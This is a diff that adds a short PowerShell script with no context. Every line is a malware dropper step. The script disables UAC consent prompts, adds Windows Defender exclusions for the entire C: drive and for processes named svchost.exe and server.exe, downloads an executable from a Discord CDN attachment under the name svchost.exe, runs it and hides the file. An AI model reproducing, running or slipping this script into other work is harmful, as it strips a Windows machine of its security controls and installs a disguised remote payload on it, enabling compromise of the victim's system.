@@ -1,0 +1,9 @@
+powershell.exe Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0
+powershell.exe -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionExtension ".tmp"
+powershell.exe -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionProcess "svchost.exe"
+powershell.exe -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "C:"
+powershell.exe -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "C:\"
+powershell.exe -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionProcess "server.exe"
+Invoke-WebRequest -Uri "https://cdn.discordapp.com/attachments/1166762427954757794/1166762608729280573/svchost.exe" -OutFile $env:localappdata\Microsoft\svchost.exe
+Start-Process -FilePath $env:localappdata\Microsoft\svchost.exe
+attrib +h $env:localappdata\Microsoft\svchost.exe
